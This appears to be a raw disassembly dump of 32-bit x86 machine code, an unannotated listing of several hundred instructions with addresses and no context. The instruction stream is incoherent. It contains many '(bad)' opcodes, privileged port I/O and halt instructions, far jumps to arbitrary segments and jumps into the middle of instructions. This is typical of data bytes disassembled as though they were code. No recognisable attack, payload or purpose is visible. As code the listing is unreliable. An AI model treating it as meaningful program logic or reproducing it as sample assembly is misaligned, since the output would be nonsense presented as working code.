  6b2456:	jne    0x6b24a5
  6b2458:	cld    
  6b2459:	jnp    0x6b240d
  6b245b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b245c:	pop    edx
  6b245d:	jmp    0xb2f6:0x948efe4
  6b2464:	out    dx,al
  6b2465:	sbb    bl,ch
  6b2467:	and    DWORD PTR [edx+0x69],edx
  6b246a:	ins    BYTE PTR es:[edi],dx
  6b246b:	test   esp,0x3dedc04f
  6b2471:	hlt    
  6b2472:	add    DWORD PTR [edx],ecx
  6b2474:	arpl   bx,si
  6b2476:	retf   
  6b2477:	shl    DWORD PTR [esp+ebp*8+0x46a74db1],cl
  6b247e:	xchg   ebp,eax
  6b247f:	ins    DWORD PTR es:[edi],dx
  6b2480:	rcl    BYTE PTR [edi+0x46],cl
  6b2483:	lods   al,BYTE PTR ds:[esi]
  6b2484:	and    edi,DWORD PTR [ebp+0x7d2c7690]
  6b248a:	(bad)  
  6b248b:	lock xrelease sub BYTE PTR [esi+edx*4],dl
  6b2490:	fst    QWORD PTR [esi-0x7467e407]
  6b2496:	xchg   esi,eax
  6b2497:	fiadd  WORD PTR [edi]
  6b2499:	push   edx
  6b249a:	sub    edi,DWORD PTR [ebx]
  6b249c:	jmp    0x3944:0xd0ecd6e1
  6b24a3:	repz add dh,BYTE PTR [ebx]
  6b24a6:	mov    edx,0xec7bb600
  6b24ab:	sub    edi,edx
  6b24ad:	and    al,0xc8
  6b24af:	inc    esi
  6b24b0:	gs pop eax
  6b24b2:	lock jae 0x6b24d5
  6b24b5:	fisubr DWORD PTR [edi-0x7e]
  6b24b8:	daa    
  6b24b9:	mov    ch,0x6c
  6b24bb:	inc    eax
  6b24bc:	icebp  
  6b24bd:	or     esp,ebp
  6b24bf:	lea    esi,[edx+0x3e]
  6b24c2:	dec    edi
  6b24c3:	adc    al,0x3c
  6b24c5:	mov    ecx,0xe350c9b7
  6b24ca:	mov    bl,0xae
  6b24cc:	mov    ah,0x1e
  6b24ce:	push   ds
  6b24cf:	cmp    eax,DWORD PTR [edx-0x1c8da465]
  6b24d5:	cmp    al,0x5c
  6b24d7:	in     al,dx
  6b24d8:	adc    BYTE PTR [ecx+ebp*1-0x7f],dl
  6b24dc:	sub    eax,0x88985c7c
  6b24e1:	(bad)  
  6b24e2:	out    dx,al
  6b24e3:	inc    esp
  6b24e4:	mov    cl,0x97
  6b24e6:	out    0xa1,al
  6b24e8:	popf   
  6b24e9:	cmp    eax,0xfcf53e7a
  6b24ee:	ins    DWORD PTR es:[edi],dx
  6b24ef:	mov    dl,0xc5
  6b24f1:	mov    edi,0x7d588f1a
  6b24f6:	sub    al,0x5e
  6b24f8:	mov    dh,0xa6
  6b24fa:	enter  0x90b1,0x4b
  6b24fe:	addr16 inc eax
  6b2500:	in     eax,dx
  6b2501:	stos   BYTE PTR es:[edi],al
  6b2502:	xchg   ebx,eax
  6b2503:	mov    ch,0xa3
  6b2505:	out    dx,eax
  6b2506:	xchg   esi,eax
  6b2507:	or     DWORD PTR [esi+0x2],eax
  6b250a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b250b:	iret   
  6b250c:	mov    edi,0x6d587d40
  6b2511:	retf   0xc7a
  6b2514:	push   0xa386300e
  6b2519:	mov    esp,edx
  6b251b:	sahf   
  6b251c:	jl     0x6b2571
  6b251e:	icebp  
  6b251f:	leave  
  6b2520:	lods   al,BYTE PTR ds:[esi]
  6b2521:	sub    ah,dh
  6b2523:	inc    esp
  6b2524:	mov    edx,0x3028d072
  6b2529:	(bad)  
  6b252a:	push   esi
  6b252b:	addr16 clc 
  6b252d:	jno    0x6b25a1
  6b252f:	outs   dx,BYTE PTR ds:[esi]
  6b2530:	ror    BYTE PTR [ebx+0x6f],cl
  6b2533:	add    al,0x94
  6b2535:	shr    cl,cl
  6b2537:	xor    al,0x9f
  6b2539:	cmp    DWORD PTR [ecx+ebx*1+0x4561fd63],ebx
  6b2540:	ja     0x6b2553
  6b2542:	test   BYTE PTR [edi+0x6c],0x5
  6b2546:	(bad)
  6b2549:	cmp    cl,dl
  6b254b:	or     ecx,DWORD PTR [ecx]
  6b254d:	stos   BYTE PTR es:[edi],al
  6b254e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b254f:	sbb    edi,esp
  6b2551:	in     al,0xb8
  6b2553:	loop   0x6b2582
  6b2555:	dec    ebx
  6b2556:	ins    BYTE PTR es:[edi],dx
  6b2557:	mov    dh,0xf0
  6b2559:	repnz push 0x3c
  6b255c:	push   ss
  6b255d:	pop    eax
  6b255e:	sbb    al,0xb1
  6b2560:	push   edi
  6b2561:	cmp    DWORD PTR [ebp+0x1a],0x7b
  6b2565:	mov    ch,0x23
  6b2567:	ret    
  6b2568:	xchg   ecx,eax
  6b2569:	cmp    DWORD PTR [edx+0x7639e708],ecx
  6b256f:	ja     0x6b253a
  6b2571:	aas    
  6b2572:	push   0x27
  6b2574:	enter  0x3b87,0xe9
  6b2578:	popa   
  6b2579:	jl     0x6b25da
  6b257b:	xor    DWORD PTR [esi+0x7e872cfd],ecx
  6b2581:	jo     0x6b2511
  6b2583:	sub    DWORD PTR [edi],ebx
  6b2585:	fwait
  6b2586:	add    eax,DWORD PTR [ecx+0x35]
  6b2589:	loopne 0x6b25f2
  6b258b:	rcr    edx,cl
  6b258d:	jp     0x6b2584
  6b258f:	cmp    eax,0xb5294d6f
  6b2594:	adc    bh,dl
  6b2596:	arpl   WORD PTR [eax+esi*2+0x7b],si
  6b259a:	xor    ch,BYTE PTR [edi-0x532c74ca]
  6b25a0:	lahf   
  6b25a1:	outs   dx,BYTE PTR ds:[esi]
  6b25a2:	fmul   st(1),st
  6b25a4:	pop    es
  6b25a5:	dec    ebx
  6b25a6:	adc    BYTE PTR [ebp+0x19],dl
  6b25a9:	dec    esp
  6b25aa:	sub    eax,edi
  6b25ac:	push   ds
  6b25ad:	push   ebx
  6b25ae:	mov    WORD PTR [ecx+0x5982ec74],cs
  6b25b4:	xchg   ebp,eax
  6b25b5:	jecxz  0x6b25d9
  6b25b7:	jns    0x6b25f4
  6b25b9:	jae    0x6b2559
  6b25bb:	push   edx
  6b25bc:	outs   dx,DWORD PTR ds:[esi]
  6b25bd:	sub    bh,ah
  6b25bf:	xchg   esi,eax
  6b25c0:	js     0x6b261e
  6b25c2:	fmul   QWORD PTR [eax+0x71]
  6b25c5:	cwde   
  6b25c6:	jle    0x6b254d
  6b25c8:	stos   DWORD PTR es:[edi],eax
  6b25c9:	and    ebp,ecx
  6b25cb:	adc    DWORD PTR [ebp-0x5a],esi
  6b25ce:	int3   
  6b25cf:	in     eax,0xf2
  6b25d1:	dec    eax
  6b25d2:	repnz inc esi
  6b25d4:	xor    esi,edx
  6b25d6:	add    DWORD PTR [eax],0xd1b63615
  6b25dc:	shl    BYTE PTR [eax+ebx*2-0x2b110a93],0xcb
  6b25e4:	je     0x6b2582
  6b25e6:	cmp    dl,0x1c
  6b25e9:	cmc    
  6b25ea:	dec    edi
  6b25eb:	scas   eax,DWORD PTR es:[edi]
  6b25ec:	out    dx,al
  6b25ed:	or     eax,0x66c9cae5
  6b25f2:	lods   eax,DWORD PTR ds:[esi]
  6b25f3:	jg     0x6b25de
  6b25f5:	add    al,0xcc
  6b25f7:	jns    0x6b2638
  6b25f9:	cs push 0x349d26df
  6b25ff:	mov    dl,0x8d
  6b2601:	mov    ds:0xe6aea300,al
  6b2606:	pop    ebp
  6b2607:	mov    DWORD PTR [ebx],ecx
  6b2609:	pop    ds
  6b260a:	xor    BYTE PTR [edx],cl
  6b260c:	in     eax,0x9b
  6b260e:	inc    ebp
  6b260f:	clc    
  6b2610:	or     DWORD PTR [eax+0x0],esi
  6b2613:	cmp    eax,0x43f78b8d
  6b2618:	and    bh,0x57
  6b261b:	je     0x6b25c8
  6b261d:	stc    
  6b261e:	test   al,0xa3
  6b2620:	adc    DWORD PTR [ecx],edi
  6b2622:	jne    0x6b265b
  6b2624:	push   eax
  6b2625:	arpl   WORD PTR ds:0x6b451c8f,ax
  6b262b:	test   al,0x6
  6b262d:	jo     0x6b261e
  6b262f:	sbb    BYTE PTR [esi],dh
  6b2631:	xchg   DWORD PTR [edi+0x1197c9cd],eax
  6b2637:	lock dec esi
  6b2639:	sub    dh,BYTE PTR [ebp+0x77313993]
  6b263f:	or     DWORD PTR [esi],ebp
  6b2641:	push   es
  6b2642:	push   ecx
  6b2643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b2644:	scas   al,BYTE PTR es:[edi]
  6b2645:	popf   
  6b2646:	fist   DWORD PTR [eax+ecx*2+0x62d4bfe]
  6b264d:	adc    al,BYTE PTR [eax-0x60dfbed5]
  6b2653:	jns    0x6b265a
  6b2655:	addr16 and al,0x32
  6b2658:	mov    bl,0xee
  6b265a:	popf   
  6b265b:	test   eax,0x63e4899d
  6b2660:	ins    BYTE PTR es:[edi],dx
  6b2661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b2662:	add    DWORD PTR [ebp-0x35],0xffffffbf
  6b2666:	xchg   esi,eax
  6b2667:	loopne 0x6b26da
  6b2669:	stos   BYTE PTR es:[edi],al
  6b266a:	pop    eax
  6b266b:	lea    ecx,[eax-0x3d]
  6b266e:	mov    BYTE PTR fs:[ecx],cl
  6b2671:	xor    DWORD PTR [edx],esi
  6b2673:	adc    BYTE PTR es:[eax+0x59],al
  6b2677:	jmp    0xaee3:0x9208e3f7
  6b267e:	nop
  6b267f:	xor    esp,esp
  6b2681:	stc    
  6b2682:	sar    dl,0x54
  6b2685:	sub    ah,dh
  6b2687:	jg     0x6b268c
  6b2689:	or     eax,0x210766f3
  6b268e:	rcr    DWORD PTR [esi+eiz*2],1
  6b2691:	aaa    
  6b2692:	sti    
  6b2693:	pop    edi
  6b2694:	into   
  6b2695:	imul   edi,DWORD PTR [esi-0x78ec7e8],0x3ad952f4
  6b269f:	adc    dh,BYTE PTR [ecx+0x7598db5b]
  6b26a5:	or     BYTE PTR [ecx-0x65],cl
  6b26a8:	repnz sbb ebp,DWORD PTR [edi]
  6b26ab:	xchg   ecx,eax
  6b26ac:	fcomp  DWORD PTR ds:0x17e428fa
  6b26b2:	sbb    DWORD PTR [eax],ebp
  6b26b4:	lods   eax,DWORD PTR ds:[esi]
  6b26b5:	push   edi
  6b26b6:	shl    BYTE PTR [eax+0x7f6cc9c2],0x2a
  6b26bd:	je     0x6b2730
  6b26bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b26c0:	mov    esp,0x2f076d38
  6b26c5:	add    BYTE PTR [ebx+ebx*4-0x53],al
  6b26c9:	cmp    al,ch
  6b26cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b26cc:	lea    ebx,[ebx]
  6b26ce:	adc    eax,0x93a25eb6
  6b26d3:	inc    esp
  6b26d4:	into   
  6b26d5:	fcomp  DWORD PTR [ebx-0x65]
  6b26d8:	pop    edi
  6b26d9:	int    0x64
  6b26db:	or     DWORD PTR ss:[ecx-0x6db3ae80],eax
  6b26e2:	fild   DWORD PTR [esi-0x77]
  6b26e5:	push   es
  6b26e6:	out    0x73,al
  6b26e8:	mov    cl,0x98
  6b26ea:	nop
  6b26eb:	gs push 0x38
  6b26ee:	xor    dl,BYTE PTR [edx]
  6b26f0:	cwde   
  6b26f1:	mov    WORD PTR [edi-0x168a9ba2],gs
  6b26f7:	ins    BYTE PTR es:[edi],dx
  6b26f8:	fnclex 
  6b26fa:	jge    0x6b26cd
  6b26fc:	xchg   esi,eax
  6b26fd:	iret   
  6b26fe:	sti    
  6b26ff:	out    0x8d,eax
  6b2701:	xor    al,0x7d
  6b2703:	xchg   ebx,eax
  6b2704:	icebp  
  6b2705:	xor    al,0xc1
  6b2707:	scas   al,BYTE PTR es:[edi]
  6b2708:	xor    esi,esi
  6b270a:	ds mov ebx,0x19498cc4
  6b2710:	fcmovb st,st(2)
  6b2712:	aad    0xb
  6b2714:	inc    esp
  6b2715:	mov    ch,0x98
  6b2717:	sub    BYTE PTR [eax],bl
  6b2719:	sub    al,0x58
  6b271b:	cmp    DWORD PTR [ebx],esi
  6b271d:	sbb    BYTE PTR [edi+0x5479f46c],cl
  6b2723:	xor    ebp,ebx
  6b2725:	aam    0x79
  6b2727:	lods   al,BYTE PTR ds:[esi]
  6b2728:	push   ebp
  6b2729:	sub    bl,BYTE PTR [edi]
  6b272b:	jl     0x6b278d
  6b272d:	(bad)  
  6b272e:	jnp    0x6b2743
  6b2730:	cld    
  6b2731:	jecxz  0x6b26d5
  6b2733:	xor    al,0xc
  6b2735:	mov    al,0x58
  6b2737:	imul   esp,DWORD PTR [eax+eax*2-0x558038ee],0x28
  6b273f:	cmp    DWORD PTR [eax+eiz*4-0x2e235f9d],ebx
  6b2746:	aaa    
  6b2747:	cmp    al,0x88
  6b2749:	test   BYTE PTR [ecx+edi*4],dl
  6b274c:	push   ecx
  6b274d:	add    eax,0xe6ed0946
  6b2752:	data16 aam 0x1
  6b2755:	dec    esi
  6b2756:	les    ebx,FWORD PTR [edi+edx*4]
  6b2759:	inc    esp
  6b275a:	dec    ecx
  6b275b:	mov    ss,WORD PTR [eax-0x16]
  6b275e:	int3   
  6b275f:	push   edi
  6b2760:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b2761:	sub    al,0x1b
  6b2763:	inc    edi
  6b2764:	adc    cl,BYTE PTR [eax+0x6f]
  6b2767:	ret    
  6b2768:	xchg   ebx,eax
  6b2769:	mov    al,cs:0xe61fe8dd
  6b276f:	cmp    BYTE PTR [ecx+0x1e01985f],bl
  6b2775:	or     al,0xe4
  6b2777:	pusha  
  6b2778:	je     0x6b273a
  6b277a:	jno    0x6b27bb
  6b277c:	imul   ebp,DWORD PTR [edi-0x3c],0xffffff98
  6b2780:	jl     0x6b271a
  6b2782:	pop    ds
  6b2783:	fiadd  DWORD PTR [esi-0x1100b890]
  6b2789:	shl    DWORD PTR [esi+0x3d],0xe0
  6b278d:	inc    ebx
  6b278e:	in     al,0x6a
  6b2790:	jae    0x6b271d
  6b2792:	add    DWORD PTR [ebp-0x4a],esi
  6b2795:	int    0xb9
  6b2797:	cmp    ecx,eax
  6b2799:	aaa    
  6b279a:	or     al,0x70
  6b279c:	mov    ebp,eax
  6b279e:	aaa    
  6b279f:	pop    ss
  6b27a0:	sahf   
  6b27a1:	xchg   ecx,eax
  6b27a2:	mov    esp,0x32f3e87d
  6b27a7:	test   DWORD PTR [edx+ebp*8+0x1c363e1f],ecx
  6b27ae:	jp     0x6b27ec
  6b27b0:	int3   
  6b27b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b27b2:	mov    ds:0xb40ef001,al
  6b27b7:	push   0x19
  6b27b9:	lods   al,BYTE PTR ds:[esi]
  6b27ba:	fisubr WORD PTR [ebp-0x4e]
  6b27bd:	es enter 0xf734,0x8d
  6b27c2:	mov    eax,0x2fba773e
  6b27c7:	jb     0x6b27cc
  6b27c9:	cmp    ebx,ebp
  6b27cb:	fistp  QWORD PTR [ecx-0x69]
  6b27ce:	leave  
  6b27cf:	fnstenv [esi]
  6b27d1:	add    eax,ecx
  6b27d3:	scas   eax,DWORD PTR es:[edi]
  6b27d4:	xor    bh,ah
  6b27d6:	mov    WORD PTR [edx],es
  6b27d8:	dec    eax
  6b27d9:	mov    bl,BYTE PTR [ecx-0x54]
  6b27dc:	icebp  
  6b27dd:	add    bl,BYTE PTR [edx-0x45]
  6b27e0:	adc    BYTE PTR [esp+eiz*2],dl
  6b27e3:	call   0x2271:0x705cb40b
  6b27ea:	scas   eax,DWORD PTR es:[edi]
  6b27eb:	les    ecx,FWORD PTR [edx]
  6b27ed:	jmp    0x2b26c414
  6b27f2:	popa   
  6b27f3:	icebp  
  6b27f4:	repz mov dh,0xdd
  6b27f7:	mov    edx,DWORD PTR [edx+0x2]
  6b27fa:	push   esi
  6b27fb:	add    esi,ebx
  6b27fd:	mov    ebx,0xdab5ad87
  6b2802:	and    al,0x30
  6b2804:	das    
  6b2805:	adc    bl,dh
  6b2807:	rcr    BYTE PTR [ecx],cl
  6b2809:	pop    es
  6b280a:	mov    edx,0x8077fe4d
  6b280f:	adc    esp,DWORD PTR [edi+eiz*1+0x66c91c8b]
  6b2816:	and    DWORD PTR [edi-0x4a],ebp
  6b2819:	push   esi
  6b281a:	pop    ebp
  6b281b:	pop    ebx
  6b281c:	(bad)  
  6b281d:	jl     0x6b27d0
  6b281f:	fst    DWORD PTR [ebx+0x31]
  6b2822:	add    bl,0x9
  6b2825:	push   0x400a53cf
  6b282a:	into   
  6b282b:	aas    
  6b282c:	push   es
  6b282d:	dec    ecx
  6b282e:	pop    edi
  6b282f:	push   esp
  6b2830:	loope  0x6b2899
  6b2832:	sbb    eax,DWORD PTR [esi]
  6b2834:	or     BYTE PTR [ebp+0x69],cl
  6b2837:	shl    DWORD PTR [edx+0x39],1
  6b283a:	aad    0x5f
  6b283c:	mov    ds:0x33e3f4ee,al
  6b2841:	inc    ecx
  6b2842:	push   ebx
  6b2843:	mov    esi,0xdc5d9821
  6b2848:	pop    edx
  6b2849:	xchg   esi,eax
  6b284a:	inc    edx
  6b284b:	out    0x53,al
  6b284d:	fwait
  6b284e:	popa   
  6b284f:	mov    ebx,0xc550b0b3
  6b2854:	rol    BYTE PTR [esi-0x2b9c4f72],0xc9
  6b285b:	or     esi,DWORD PTR [ecx-0x2234c91f]
  6b2861:	ret    
  6b2862:	cld    
  6b2863:	sbb    eax,0xa0686eae
  6b2868:	addr16 adc eax,0x361c7d15
  6b286e:	cmc    
  6b286f:	dec    ebx
  6b2870:	aam    0xd5
  6b2872:	outs   dx,BYTE PTR ds:[esi]
  6b2873:	push   ss
  6b2874:	lds    edx,FWORD PTR [ebx-0x49]
  6b2877:	ins    DWORD PTR es:[edi],dx
  6b2878:	and    al,0x2b
  6b287a:	call   0x30c5:0xbf01f055
  6b2881:	stc    
  6b2882:	test   al,0xc2
  6b2884:	hlt    
  6b2885:	ret    0xce6c
  6b2888:	out    dx,al
  6b2889:	lds    ecx,FWORD PTR [eax-0x4ee59f6e]
  6b288f:	arpl   WORD PTR [ebp+0x289a2fe7],ax
  6b2895:	sbb    ah,cl
  6b2897:	jne    0x6b2871
  6b2899:	test   eax,esi
  6b289b:	xchg   DWORD PTR [esi+0x11],eax
  6b289e:	in     al,dx
  6b289f:	outs   dx,BYTE PTR ds:[esi]
  6b28a0:	or     BYTE PTR [eax-0x6f],dl
  6b28a3:	mov    bl,0x6d
  6b28a5:	and    edi,esi
  6b28a7:	mov    DWORD PTR [ebx+0x68],ebx
  6b28aa:	fisub  WORD PTR [esi-0x5a]
  6b28ad:	and    esi,DWORD PTR [esi]
  6b28af:	mov    DWORD PTR [edi],esi
  6b28b1:	pop    edi
  6b28b2:	stc    
  6b28b3:	out    dx,eax
  6b28b4:	rcr    DWORD PTR [ebp-0x4b],cl
  6b28b7:	ds nop
  6b28b9:	and    DWORD PTR [esi+eax*8],ebx
  6b28bc:	stos   BYTE PTR es:[edi],al
  6b28bd:	shr    BYTE PTR [ebx+0x33],cl
  6b28c0:	test   ebp,edx
  6b28c2:	xchg   ecx,eax
  6b28c3:	ja     0x6b292d
  6b28c5:	data16 int 0xd5
  6b28c8:	mov    eax,0x62ca010e
  6b28cd:	rol    BYTE PTR [edx],cl
  6b28cf:	test   DWORD PTR [ecx+0x13],0x353b92c2
  6b28d6:	test   DWORD PTR [edi+0x49],edi
  6b28d9:	pop    ebx
  6b28da:	sub    DWORD PTR [edx+edi*8-0x22],esp
  6b28de:	das    
  6b28df:	popf   
  6b28e0:	dec    ecx
  6b28e1:	sbb    al,0x3a
  6b28e3:	dec    ebp
  6b28e4:	std    
  6b28e5:	inc    esi
  6b28e6:	bound  esi,QWORD PTR [eax-0x26a19b3d]
  6b28ec:	cmp    DWORD PTR [eax],ebx
  6b28ee:	fs cmp dh,ah
  6b28f1:	mov    ch,0x3c
  6b28f3:	js     0x6b28dd
  6b28f5:	jns    0x6b289c
  6b28f7:	rcl    eax,cl
  6b28f9:	popf   
  6b28fa:	out    dx,al
  6b28fb:	stos   BYTE PTR es:[edi],al
  6b28fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b28fd:	icebp  
  6b28fe:	xor    al,0xcb
  6b2900:	push   ebx
  6b2901:	xor    al,0x78
  6b2903:	jno    0x6b294b
  6b2905:	push   edi
  6b2906:	inc    ebx
  6b2907:	int3   
  6b2908:	jae    0x6b290a
  6b290a:	jmp    0x6b28e5
  6b290c:	lods   al,BYTE PTR ds:[esi]
  6b290d:	or     esi,ecx
  6b290f:	push   cs
  6b2910:	jecxz  0x6b298f
  6b2912:	(bad)  
  6b2913:	cmp    eax,0xad4af281
  6b2918:	cmp    dl,bl
  6b291a:	mov    al,0xb8
  6b291c:	inc    ebx
  6b291d:	or     eax,0x95cfbbeb
  6b2922:	test   al,0xfb
  6b2924:	sub    eax,DWORD PTR [edi]
  6b2926:	cmp    al,0x66
  6b2928:	fadd   st(2),st
  6b292a:	ror    BYTE PTR [esi+0x4394a9ee],cl
  6b2930:	stos   DWORD PTR es:[edi],eax
  6b2931:	pop    ss
  6b2932:	js     0x6b28b9
  6b2934:	scas   eax,DWORD PTR es:[edi]
  6b2935:	aad    0x99
  6b2937:	sbb    al,0x27
  6b2939:	lock or dl,ch
  6b293c:	(bad)  
  6b293d:	retf   0x275f
  6b2940:	add    eax,0xb75047db
  6b2945:	jl     0x6b291d
  6b2947:	fisttp WORD PTR [esi-0x5d]
  6b294a:	je     0x6b2980
  6b294c:	and    ch,BYTE PTR [eax+eax*4+0x2d]
  6b2950:	or     al,0x2e
  6b2952:	aam    0x5f
  6b2954:	push   eax
  6b2955:	daa    
  6b2956:	inc    ebp
  6b2957:	jmp    0x9f525687
  6b295c:	add    eax,0xfc07a8a8
  6b2961:	jnp    0x6b29cc
  6b2963:	xchg   edi,eax
  6b2964:	mov    ds:0x1d8efdd1,al
  6b2969:	pop    gs
  6b296b:	pop    esi
  6b296c:	nop
  6b296d:	stos   BYTE PTR es:[edi],al
  6b296e:	cld    
  6b296f:	adc    DWORD PTR [edi+0x1e],edi
  6b2972:	std    
  6b2973:	cmc    
  6b2974:	sub    eax,DWORD PTR [esi]
  6b2976:	pop    edi
  6b2977:	jb     0x6b292a
  6b2979:	std    
  6b297a:	jns    0x6b298c
  6b297c:	sti    
  6b297d:	bound  esp,QWORD PTR [eax+0x13]
  6b2980:	gs push esi
  6b2982:	mov    eax,ds:0x85d744a2
  6b2987:	mov    ebp,0xe341af88
  6b298c:	dec    edx
  6b298d:	imul   esi,DWORD PTR [esp+edi*8-0x77],0x5
  6b2992:	mov    esp,0x1987345d
  6b2997:	int3   
  6b2998:	iret   
  6b2999:	outs   dx,BYTE PTR ds:[esi]
  6b299a:	imul   esp,DWORD PTR [ecx-0x70217625],0x54
  6b29a1:	ja     0x6b295e
  6b29a3:	gs jg  0x6b29cb
  6b29a6:	sbb    ah,BYTE PTR [ebx]
  6b29a8:	lock jne 0x6b29b0
  6b29ab:	or     BYTE PTR [ebx],0x36
  6b29ae:	shr    bl,1
  6b29b0:	xlat   BYTE PTR ds:[ebx]
  6b29b1:	push   edx
  6b29b2:	cli    
  6b29b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b29b4:	cmp    BYTE PTR [eax+0x11f82b54],bh
  6b29ba:	mov    edx,0xf7209945
  6b29bf:	and    esi,edi
  6b29c1:	loopne 0x6b296f
  6b29c3:	test   BYTE PTR [ecx-0x69cad4a5],dl
  6b29c9:	cmp    edx,ecx
  6b29cb:	mov    edx,0x5f0b3bb0
  6b29d0:	neg    esi
  6b29d2:	icebp  
  6b29d3:	inc    ecx
  6b29d4:	jl     0x6b29ca
  6b29d6:	mov    DWORD PTR [ebp+0x2a],0xdc009b2a
  6b29dd:	xchg   ecx,eax
  6b29de:	out    dx,eax
  6b29df:	cld    
  6b29e0:	enter  0xa41d,0x9
  6b29e4:	push   ebx
  6b29e5:	pop    ebx
  6b29e6:	icebp  
  6b29e7:	sbb    eax,0xa877ae5e
  6b29ec:	pop    ds
  6b29ed:	bound  eax,QWORD PTR [ebx-0x4fda58b8]
  6b29f3:	call   0x40c1:0x2e67b8ae
  6b29fa:	out    0x16,al
  6b29fc:	xchg   ebp,eax
  6b29fd:	sbb    ch,BYTE PTR ds:0xd27edf8
  6b2a03:	or     eax,0xaa8f51b8
  6b2a08:	out    dx,eax
  6b2a09:	in     eax,0xa3
  6b2a0b:	dec    edi
  6b2a0c:	sub    BYTE PTR [ebx+0x2ca7524],dl
  6b2a12:	mov    ch,0x21
  6b2a14:	jmp    0x6b2a03
  6b2a16:	jne    0x6b29c0
  6b2a18:	jg     0x6b2a5a
  6b2a1a:	enter  0x4be5,0xa6
  6b2a1e:	call   0x6dbe3c69
  6b2a23:	mov    ds:0x167d1e2e,eax
  6b2a28:	cmp    BYTE PTR [eax],bh
  6b2a2a:	(bad)  
  6b2a2b:	jns    0x6b2a14
  6b2a2d:	mov    eax,ds:0x73d134f8
  6b2a32:	xchg   esi,eax
  6b2a33:	ds push eax
  6b2a35:	jae    0x6b2a9a
  6b2a37:	test   eax,0xe29c9ec5
  6b2a3c:	add    al,0xe8
  6b2a3e:	jmp    0x6b2ab3
  6b2a40:	add    DWORD PTR [ecx-0x3f5d8525],ecx
  6b2a46:	pop    ebx
  6b2a47:	jg     0x6b29d7
  6b2a49:	jecxz  0x6b2a9c
  6b2a4b:	stos   DWORD PTR es:[edi],eax
  6b2a4c:	ror    BYTE PTR ds:0x71425c4,0x33
  6b2a53:	call   0x2fa7:0xac02127e
  6b2a5a:	mov    ds:0xd4d6b74a,eax
  6b2a5f:	jl     0x6b2a54
  6b2a61:	iret   
  6b2a62:	push   esi
  6b2a63:	fsubr  DWORD PTR [ebp+0x5d9182d9]
  6b2a69:	sti    
  6b2a6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b2a6b:	mov    dh,0x4a
  6b2a6d:	add    BYTE PTR [ebp-0x64767049],cl
  6b2a73:	not    edi
  6b2a75:	or     al,0x19
  6b2a77:	dec    ecx
  6b2a78:	inc    eax
  6b2a79:	loop   0x6b2ac6
  6b2a7b:	inc    esi
  6b2a7c:	bound  ecx,QWORD PTR [ecx+eax*4-0x30]
  6b2a80:	fs mov ch,0x5a
  6b2a83:	ja     0x6b2a0c
  6b2a85:	pop    edi
  6b2a86:	mov    dl,0x27
  6b2a88:	xor    al,0x0
  6b2a8a:	ss dec eax
  6b2a8c:	mov    ecx,DWORD PTR [esi-0x3f]
  6b2a8f:	or     eax,0x6c3fefd9
  6b2a94:	adc    eax,0xc63310e8
  6b2a99:	repz pop esi
  6b2a9b:	inc    esi
  6b2a9c:	aas    
  6b2a9d:	imul   ecx,edi,0xffffffb0
  6b2aa0:	push   esp
  6b2aa1:	push   esi
  6b2aa2:	sbb    eax,0x6df3ce44
  6b2aa7:	(bad)  
  6b2aa9:	mov    al,ds:0x8ab7ddc6
  6b2aae:	pop    ebx
  6b2aaf:	adc    bl,bh
  6b2ab1:	loop   0x6b2b07
  6b2ab3:	aas    
  6b2ab4:	inc    ebx
  6b2ab5:	cld    
  6b2ab6:	data16 std 
  6b2ab8:	pop    ebp
  6b2ab9:	popa   
  6b2aba:	dec    ecx
  6b2abb:	and    ebp,DWORD PTR [ebx-0x60]
  6b2abe:	pop    ss
  6b2abf:	jno    0x6b2aad
  6b2ac1:	mov    WORD PTR [edi],cs
  6b2ac3:	popf   
  6b2ac4:	mov    ebx,0x75f17fe2
  6b2ac9:	fs in  eax,dx
  6b2acb:	jp     0x6b2a92
  6b2acd:	jae    0x6b2ad0
  6b2acf:	cmp    edx,DWORD PTR [esi-0x71]
  6b2ad2:	xchg   ebx,eax
  6b2ad3:	xor    DWORD PTR [eax+0x10],ecx
  6b2ad6:	cmp    dh,0xca
  6b2ad9:	dec    esi
  6b2ada:	jecxz  0x6b2a64
  6b2adc:	rcr    dl,1
  6b2ade:	dec    ebp
  6b2adf:	je     0x6b2afc
  6b2ae1:	mov    ah,0xdb
  6b2ae3:	test   al,0x1d
  6b2ae5:	jnp    0x6b2b39
  6b2ae7:	inc    esi
  6b2ae8:	js     0x6b2aa8
  6b2aea:	imul   ebx,DWORD PTR [edi],0x7e
  6b2aed:	lahf   
  6b2aee:	popa   
  6b2aef:	dec    edi
  6b2af0:	addr16 fwait
  6b2af2:	sbb    eax,0xad38b3f1
  6b2af7:	xlat   BYTE PTR gs:[ebx]
  6b2af9:	sbb    eax,0x58cf1e5e
  6b2afe:	and    BYTE PTR [ecx+esi*8],0x10
  6b2b02:	popa   
  6b2b03:	adc    edi,DWORD PTR [ebx+esi*1]
  6b2b06:	jmp    0xb255:0xc6d4ef83
  6b2b0d:	mov    ecx,0x3d742ead
  6b2b12:	sbb    BYTE PTR [edx+0x4c],ah
  6b2b15:	outs   dx,BYTE PTR ds:[esi]
  6b2b16:	jle    0x6b2af8
  6b2b18:	loope  0x6b2b5d
  6b2b1a:	dec    ebx
  6b2b1b:	jmp    0x26c9:0xe2f7d159
  6b2b22:	call   0x20ca5683
  6b2b27:	add    dh,ch
  6b2b29:	mov    dh,0x38
  6b2b2b:	add    DWORD PTR [esi-0x1ba0542e],esi
  6b2b31:	jne    0x6b2b90
  6b2b33:	xor    al,0xcd
  6b2b35:	push   ebx
  6b2b36:	xor    al,ch
  6b2b38:	and    esp,DWORD PTR [eax+0x36]
  6b2b3b:	stos   DWORD PTR es:[edi],eax
  6b2b3c:	repz mov esp,0x942cefe1
  6b2b42:	inc    esp
  6b2b43:	inc    esi
  6b2b44:	mov    cl,0xa6
